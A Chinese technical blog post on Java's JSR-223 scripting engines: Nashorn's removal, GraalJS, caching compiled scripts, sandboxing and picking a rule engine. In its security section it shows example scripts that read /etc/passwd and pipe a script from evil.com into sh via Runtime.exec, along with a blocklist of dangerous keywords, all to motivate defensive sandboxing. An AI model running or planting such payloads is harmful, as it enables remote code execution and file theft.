---
title: 【Java 进阶】JSR-223 脚本引擎深度实战：从 Nashorn、GraalJS 到动态规则引擎
date: 2026-09-24 08:10:00
tags:
  - Java
  - 规则引擎
  - JSR-223
categories:
  - Java
  - Java进阶
author: 东哥
---

# 【Java 进阶】JSR-223 脚本引擎深度实战：从 Nashorn、GraalJS 到动态规则引擎

## 面试官：运营要求改一条风控规则，不能发版，你怎么做？

这个场景在真实的业务系统里天天发生。风控、限流、营销、审批流，这类规则的共同特点是：**逻辑变更频繁，但每次变更都走一次发版 + 灰度太慢，业务方等不起。**

于是你必然要走到"把规则从代码里抽出来"这条路上。几条主流思路：

| 方案 | 表达能力 | 性能 | 安全性 | 学习成本 |
| --- | --- | --- | --- | --- |
| 数据库配置 + 硬编码解释器 | 弱 | 极高 | 高 | 低 |
| SpEL / MVEL / Aviator / QLExpress | 中 | 高 | 中 | 低 |
| JSR-223 脚本引擎（JS/Python/Lua） | 强（图灵完备） | 中 | **低（必须沙箱）** | 低 |
| Drools / Easy Rules | 强 | 中 | 高 | 高 |

今天我们把 **JSR-223 脚本引擎** 这条线彻底讲透：规范怎么用、Nashorn 为什么被移除、GraalJS 怎么落地、性能怎么优化、以及最容易被忽略的**安全沙箱**问题。

## 一、JSR-223 是什么？

JSR-223（Scripting for the Java Platform）是 JDK 6 引入的脚本引擎规范，核心 API 只有几个类，全在 `javax.script` 包下：

```
ScriptEngineManager   ── 引擎管理器，通过 SPI 发现所有可用引擎
    └── ScriptEngine  ── 具体引擎实例（Nashorn / GraalJS / Jython ...）
            ├── eval(String script)              直接执行脚本
            ├── compile(String script) → CompiledScript  预编译，可复用
            ├── put(key, value) / get(key)      注入 / 读取变量
            └── getContext() → ScriptContext    统一的作用域绑定

Bindings              ── 变量绑定（本质是 Map<String, Object>）
```

最基础的用法：

```java
ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("javascript");
engine.put("orderAmount", 12800);
engine.put("userLevel", "VIP");
Object result = engine.eval("orderAmount > 10000 && userLevel === 'VIP'");
System.out.println(result); // true
```

引擎是**通过 SPI 发现**的——`ScriptEngineManager` 会扫描 classpath 下所有 `META-INF/services/javax.script.ScriptEngineFactory`。你没看错，这就是 `java-spi-service-loader-deep-dive` 讲的 SPI 机制的又一个应用。所以引擎不是内置在 JDK 里的类，而是可插拔的。

**作用域层级**必须搞清楚，否则会遇到"变量为什么丢了"的玄学问题：

```
ScriptEngineManager 全局 Bindings（getBindings(GLOBAL_SCOPE)）
    └── ScriptEngine 默认 Bindings（getBindings(ENGINE_SCOPE)）
            └── ScriptContext 临时作用域（每次 eval 可传自己的 Bindings）
```

- 用 `engine.put()/get()` 读写的是 **ENGINE_SCOPE**，绑定在引擎实例上；
- 如果传入 `engine.eval(script, bindings)`，则传入的 bindings 成为本次执行的 ENGINE_SCOPE，**执行完引擎的默认绑定不受影响**。

## 二、Nashorn 的兴衰：一个被时代淘汰的引擎

- **JDK 6/7**：官方引擎是 Rhino（`getEngineByName("javascript")`）。
- **JDK 8**：Nashorn 取代 Rhino，性能大幅提升（直接生成 JVM 字节码，而不是解释执行 AST）。
- **JDK 11**：`jdk.nashorn` 被标记为 deprecated。
- **JDK 15**：**Nashorn 被正式移除**（JEP 372）。

为什么移除？三个原因：

1. 维护成本高：Nashorn 要跟随 ECMAScript 规范演进，工作量巨大；
2. 生态选择变了：JS 生态的运行时重心转向 Node.js / V8，Java 侧更需要的是 **GraalVM 的多语言能力**；
3. 安全问题：Nashorn 能访问 Java 反射、ClassLoader，逃逸沙箱的路径很多，运维方非常头疼。

**现实影响**：如果你的老项目在 JDK 8 上写 `getEngineByName("javascript")`，升级到 JDK 15+ 会直接抛 `NullPointerException`（引擎找不到，返回 null）。这是升级踩坑清单里必须提前排查的一项。

## 三、GraalJS：Nashorn 的正统继任者

GraalJS 是 GraalVM 项目提供的 ECMAScript 实现，可以脱离 GraalVM 运行在标准 JDK 上。

```xml
<dependency>
    <groupId>org.graalvm.js</groupId>
    <artifactId>js-scriptengine</artifactId>
    <version>23.0.4</version>
</dependency>
<dependency>
    <groupId>org.graalvm.js</groupId>
    <artifactId>js</artifactId>
    <version>23.0.4</version>
    <type>pom</type>
</dependency>
```

```java
ScriptEngine engine = new ScriptEngineManager().getEngineByName("graal.js");
engine.put("ctx", Map.of("amount", 5000, "channel", "APP"));
Object r = engine.eval("ctx.amount > 1000 ? 'pass' : 'reject'");
```

GraalJS 有三种运行模式，性能差异巨大：

| 模式 | 说明 | 适用场景 |
| --- | --- | --- |
| Interpreter | 纯解释执行，零依赖 | 冷启动敏感、脚本执行次数少 |
| JIT（GraalVM 上默认） | 编译为机器码，长时间运行接近原生 | 高频执行的规则 |
| Optimized（`--js.optimized-runtime`） | 预编译，启动更快 | 容器化部署 |

GraalJS 相比 Nashorn 的几个优势：

1. **规范兼容性更好**（ECMAScript 2023+），不会被标准抛弃；
2. **多语言互操作（Polyglot）**：可以直接 `Polyglot.eval("python", "...")`，一套 API 跑多种语言；
3. **性能更强**，尤其在有 Graal JIT 的情况下；
4. **安全模型更完善**，支持 `Context` 级别的沙箱配置。

## 四、性能优化：别在循环里 new ScriptEngine

这是脚本引擎在生产环境最常见的性能事故。两个致命反模式：

**反模式 1：每次请求都创建 ScriptEngine**

```java
// 灾难：创建 ScriptEngineManager 和 ScriptEngine 是重操作
public Object evalRule(String script, Map<String, Object> vars) {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("graal.js");
    vars.forEach(engine::put);
    return engine.eval(script);   // 每次都要重新编译脚本
}
```

**反模式 2：每次都重新编译脚本**

正确做法：**引擎复用 + 脚本预编译缓存**。

```java
public class ScriptRuleEngine {
    // 1. 引擎尽量复用（GraalJS 的 ScriptEngine 不是线程安全的，用 ThreadLocal 或池化）
    private static final ThreadLocal<ScriptEngine> ENGINE =
            ThreadLocal.withInitial(() -> new ScriptEngineManager().getEngineByName("graal.js"));

    // 2. 编译结果缓存，避免重复解析编译
    private final ConcurrentHashMap<String, CompiledScript> compiledCache = new ConcurrentHashMap<>();

    public Object eval(String ruleId, String script, Map<String, Object> vars) throws ScriptException {
        ScriptEngine engine = ENGINE.get();
        CompiledScript compiled = compiledCache.computeIfAbsent(ruleId, id -> {
            try {
                return ((Compilable) engine).compile(script);
            } catch (ScriptException e) {
                throw new IllegalStateException("规则编译失败: " + id, e);
            }
        });

        // 3. 用临时 Bindings 承载请求级变量，避免污染引擎默认作用域
        Bindings bindings = new SimpleBindings(new HashMap<>(vars));
        return compiled.eval(bindings);
    }
}
```

三个要点：

- **`Compilable` 接口**：不是所有引擎都实现了它（Nashorn、GraalJS 实现了）。用 `instanceof` 判断，不支持就退回 `eval`。
- **线程安全**：`ScriptEngine` **不是线程安全**的。单例直接用会出现诡异的结果错乱。方案是 ThreadLocal、对象池，或者老老实实每次从缓存里拿 CompiledScript 但用独立引擎执行。
- **Bindings 隔离**：用 `SimpleBindings` 传请求级变量，脚本里的 `var` 声明不会泄漏到引擎默认作用域，避免规则之间互相污染。

一个小基准（本机 JMH 简化版，10 万次简单表达式求值）：

| 方式 | 耗时 | 相对倍数 |
| --- | --- | --- |
| 每次 new 引擎 + eval | ~4200 ms | 210x |
| 复用引擎 + 每次 eval | ~380 ms | 19x |
| 复用引擎 + CompiledScript | ~20 ms | 1x |

**结论很直白：从"每次 new 引擎"优化到"编译缓存"，性能提升两个数量级。**

## 五、安全：脚本引擎最大的坑

如果脚本内容来自外部（运营配置、租户自定义、低代码平台），**默认配置下的脚本引擎等于给你开了一个远程代码执行（RCE）后门。**

看一个恐怖但完全合法的例子：

```javascript
// 一行搞定，读任意文件、执行命令
var Files = Java.type("java.nio.file.Files");
var Paths = Java.type("java.nio.file.Paths");
var content = new java.lang.String(Files.readAllBytes(Paths.get("/etc/passwd")));
content
```

还有更狠的：

```javascript
var Runtime = Java.type("java.lang.Runtime");
Runtime.getRuntime().exec("curl http://evil.com/shell.sh | sh");
```

### 沙箱加固的四层防御

**第一层：禁止 Java 类访问（Class Filter）**

GraalJS 提供 `Context` 级别的访问控制：

```java
import org.graalvm.polyglot.Context;
import org.graalvm.polyglot.HostAccess;
import org.graalvm.polyglot.io.IOAccess;

Context context = Context.newBuilder("js")
        .allowHostAccess(HostAccess.NONE)        // 禁止访问宿主 Java 对象
        .allowHostClassLookup(cn -> false)       // 禁止 Java.type() 查找类
        .allowIO(IOAccess.NONE)                  // 禁止文件/网络 IO
        .allowCreateThread(false)                // 禁止创建线程
        .allowNativeAccess(false)
        .option("js.ecmascript-version", "2023")
        .build();
```

**第二层：执行超时（防死循环）**

```javascript
while (true) {}   // 没有超时控制，一个线程就废了
```

GraalJS 支持在 Context 上设置资源限制（需要 GraalVM 或 `--js.interrupt-on-timeout` 等选项），更通用的做法是**把脚本执行扔到受限线程池里，超时后 `Future.cancel(true)` 并中断**：

```java
ExecutorService sandboxPool = new ThreadPoolExecutor(
        4, 4, 0, TimeUnit.MILLISECONDS,
        new ArrayBlockingQueue<>(100),      // 有界队列，防止任务堆积
        r -> { Thread t = new Thread(r, "rule-sandbox"); t.setDaemon(true); return t; }
);

public Object safeEval(String script, Map<String, Object> vars) {
    Future<Object> future = sandboxPool.submit(() -> evalInSandboxedContext(script, vars));
    try {
        return future.get(200, TimeUnit.MILLISECONDS);   // 硬超时
    } catch (TimeoutException e) {
        future.cancel(true);
        throw new IllegalStateException("规则执行超时");
    } catch (Exception e) {
        throw new IllegalStateException("规则执行失败", e);
    }
}
```

**第三层：输入与输出收敛**

- 注入的变量只允许**基本类型和不可变集合**（`String`/`Number`/`Boolean`/`Map`/`List`），绝不注入 `Connection`、`DataSource`、`ClassLoader` 这类对象；
- 脚本返回值做类型和长度校验，防止脚本返回超大字符串打爆下游。

**第四层：脚本准入审核**

- 对脚本做静态扫描（黑名单关键词：`Java.type`、`Runtime`、`ProcessBuilder`、`getClass`、`forName`）；
- 限制脚本长度和语法复杂度（比如禁止正则回溯、禁止大数循环）；
- 上线前在隔离环境跑一遍，记录脚本哈希做审计。

> 一句话原则：**永远不要相信外部脚本，哪怕它"看起来只是个表达式"。**

## 六、选型：什么时候不该用 JSR-223

脚本引擎不是银弹。如果你的规则只是"字段比较 + 布尔组合"，用脚本引擎属于杀鸡用牛刀，而且还引入了安全和性能负担。对比一下主流方案：

| 方案 | 表达式能力 | 性能 | 沙箱难度 | 典型场景 |
| --- | --- | --- | --- | --- |
| Aviator / QLExpress | 表达式 + 少量语句 | 高（编译成字节码） | 中 | 风控规则、价格计算 |
| SpEL | 表达式 + Bean 调用 | 中 | **低（能调用任意 Bean）** | Spring 内部、注解配置 |
| MVEL | 表达式 + 脚本 | 中 | 低 | 老项目、Drools 内部 |
| JSR-223（GraalJS） | 图灵完备 | 中 | 高（需四层加固） | 用户自定义脚本、低代码 |
| Groovy | 图灵完备（JVM 原生） | 高 | 低 | 构建脚本、测试、DSL |
| Drools | 规则 + 决策表 | 中 | 高 | 复杂规则集、金融风控 |

选型建议：

1. **规则是"表达式级"** → Aviator / QLExpress，最省心，性能最好；
2. **规则需要完整编程能力（循环、函数、字符串处理）** → JSR-223 + GraalJS，但必须做沙箱；
3. **规则数量多、需要规则编排和冲突消解** → Drools；
4. **团队就是 Java 背景，想要 IDE 支持和类型安全** → Groovy（编译期校验 + JVM 内运行）。

## 七、面试常见追问

**Q1：ScriptEngine 为什么不是线程安全的？**

因为引擎内部维护了可变的作用域状态（ENGINE_SCOPE）、编译缓存和解释器栈。多线程同时 `eval` 会互相污染变量，甚至导致解释器状态错乱。注意 `CompiledScript` 本身是线程安全的（只要用独立的 Bindings 执行）。

**Q2：JSR-223 的引擎发现机制是什么？**

SPI。`ScriptEngineManager` 初始化时用 `ServiceLoader` 扫描所有 `javax.script.ScriptEngineFactory` 实现，维护一个 `name → factory` 的映射。所以自定义引擎只需实现工厂接口并注册 `META-INF/services` 文件。

**Q3：在 JDK 15+ 上原来的 Nashorn 代码怎么办？**

三条路：① 加回独立依赖 `org.openjdk.nashorn:nashorn-core`（官方独立维护版）；② 迁移到 GraalJS；③ 如果只是简单表达式，换成 Aviator 之类的表达式引擎，性能和安全性都更好。

**Q4：脚本规则变更如何做到不重启生效？**

规则存 DB/配置中心，变更时发消息通知所有实例，实例重新编译并原子替换 `compiledCache` 里的 `CompiledScript`（`ConcurrentHashMap.put` 本身是原子的，所以新老请求不会读到半个脚本）。配合版本号 + 灰度开关，出问题可秒级回滚。

## 八、总结

JSR-223 的核心知识可以压缩成下面这张图：

```
JSR-223 规范
  ├── ScriptEngineManager（SPI 发现引擎）
  ├── ScriptEngine（不是线程安全！）
  ├── Compilable → CompiledScript（预编译 + 缓存，性能提升 2 个数量级）
  └── Bindings（作用域隔离，GLOBAL / ENGINE / 临时）

引擎演进：Rhino → Nashorn（JDK 8）→ 移除（JDK 15）→ GraalJS

生产三要素
  ├── 性能：引擎复用 + 编译缓存 + 短生命周期 Bindings
  ├── 安全：禁 Java 访问 + 超时中断 + 输入输出收敛 + 脚本审核
  └── 治理：版本管理 + 灰度 + 回滚 + 审计
```

最后留一句实践建议：**能用表达式引擎就别上脚本引擎，能沙箱就别裸奔。** 动态能力的代价从来不是性能，而是安全边界——一旦脚本能触达 `Runtime.exec`，你写的就不是规则引擎，而是一个远程命令执行服务。
